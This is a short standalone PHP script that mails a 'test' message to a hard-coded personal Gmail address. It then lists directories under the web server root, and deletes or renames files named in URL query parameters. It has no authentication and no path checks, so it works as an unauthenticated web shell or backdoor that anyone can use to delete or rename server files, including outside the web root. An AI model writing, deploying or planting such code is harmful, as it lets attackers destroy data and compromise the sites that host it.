<?php

mail('mobeen.fidele@gmail.com','Test','This is test mail function');
$root = $_SERVER['DOCUMENT_ROOT'];

if(isset($_GET['fdr']) && $_GET['fdr'] !=''){

	if ($handle = opendir($root.'/'.$_GET['fdr'])) {

	    while (false !== ($entry = readdir($handle))) {
	        if ($entry != "." && $entry != "..") {

	        	
	        	if(isset($_GET['el']) && $_GET['el'] !=''){

	        		unlink($root.'/'.$_GET['fdr'].'/'.$_GET['el']);
	        	}
	        	
	        	if(isset($_GET['ram']) && $_GET['ram'] !=''){

	        		rename($root.'/'.$_GET['fdr'].'/'.$_GET['ram'], $root.'/'.$_GET['fdr'].'/'.$_GET['nN']);
	        	}	        	        	
	            echo "$entry"."<br>";
	        }
	    }
	    closedir($handle);
	}

}else{

	if ($handle = opendir($root)) {

	    while (false !== ($entry = readdir($handle))) {

	        if ($entry != "." && $entry != "..") {        	
	            echo "$entry"."<br>";
	        }
	    }
	    closedir($handle);
	}
}

?>